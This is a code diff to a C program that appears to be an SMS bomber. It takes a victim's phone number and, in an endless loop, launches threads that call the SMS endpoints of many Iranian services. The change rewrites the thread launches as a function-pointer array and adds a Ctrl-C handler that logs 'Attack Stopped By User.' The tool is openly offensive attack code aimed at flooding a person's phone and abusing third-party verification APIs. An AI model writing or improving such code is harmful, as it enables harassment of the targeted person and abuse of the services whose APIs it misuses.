@@ -7,12 +7,13 @@
 
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <pthread.h>
 #include <curl/curl.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
-
+#include <signal.h>
 
 
 void *TrobApi(void *phone){  // GET:DATA
@@ -421,6 +422,17 @@ void *BamaApi(void *phone) { // POST:DATA
 
 }
 
+void SignalHandler(int sigNum){
+
+    if ( sigNum == 2 ) {
+        printf("\n[LOG]\tAttack Stopped By User.\n\a");
+        exit(2);
+    } else {
+        puts(strsignal(sigNum));
+    }
+
+}
+
 int main(int argc, char *argv[]){
 
     if(argc < 2){
@@ -428,29 +440,24 @@ int main(int argc, char *argv[]){
         fprintf(stderr, "[ERORR] Prameter not Math.\texample: sms ( phone )\n\a");
         return -1;
     }
-
+    
+    signal(SIGINT, SignalHandler);
+        
     void *phone = argv[1];
     pthread_t thread;
 
-
+    void* (*FuncApiArr[])(void*) = {TrobApi, HamyarzbanApi, AlibabApi,
+                                    SnapfoodApi, SnapApi, Tap30Api, DivarApi,
+                                     Snapfood2Api, LenzApi, NamavaApi, RubikaApi, BamaApi};
+  
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
     while(1){
         // call api sms in new thread
-
-        pthread_create(&thread, NULL, TrobApi, phone);       
-        pthread_create(&thread, NULL, HamyarzbanApi, phone);       
-        pthread_create(&thread, NULL, AlibabApi, phone);
-        pthread_create(&thread, NULL, SnapfoodApi, phone);
-        pthread_create(&thread, NULL, SnapApi, phone);
-        pthread_create(&thread, NULL, ShadApi, phone);
-        pthread_create(&thread, NULL, Tap30Api, phone);
-        pthread_create(&thread, NULL, DivarApi, phone);
-        pthread_create(&thread, NULL, Snapfood2Api, phone);
-        pthread_create(&thread, NULL, LenzApi, phone);
-        pthread_create(&thread, NULL, NamavaApi, phone);
-        pthread_create(&thread, NULL, RubikaApi, phone);
-        pthread_create(&thread, NULL, BamaApi, phone);
+        
+        for(int i = 0; i < (sizeof FuncApiArr / sizeof FuncApiArr[0]); i++) {
+            pthread_create(&thread, NULL, FuncApiArr[i], phone);  
+        }
 
         sleep(1);
     }
